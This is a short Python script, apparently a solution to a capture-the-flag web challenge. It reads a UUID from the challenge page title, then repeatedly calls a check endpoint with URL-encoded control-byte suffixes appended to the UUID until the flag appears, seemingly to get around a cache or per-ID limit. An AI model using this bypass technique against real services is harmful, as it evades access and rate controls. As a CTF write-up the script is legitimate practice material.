import requests
from bs4 import BeautifulSoup
server = "https://cache-it-to-win-it.chall.lac.tf/"
response = requests.get(server)
soup = BeautifulSoup(response.text, 'html.parser')
title = soup.title.string
uuid_str = title
response = requests.get(server + "check?uuid=" + uuid_str)
add = ""
counter = 0
print("uuid:", uuid_str)
while "FLAG" not in response.text:
    add = "%" + hex(counter % 31)[2:].zfill(2) + "%" + hex(counter // 31)[2:].zfill(2)
    response = requests.get(server + "check?uuid=" + uuid_str + add)
    counter += 1
print(response.text)
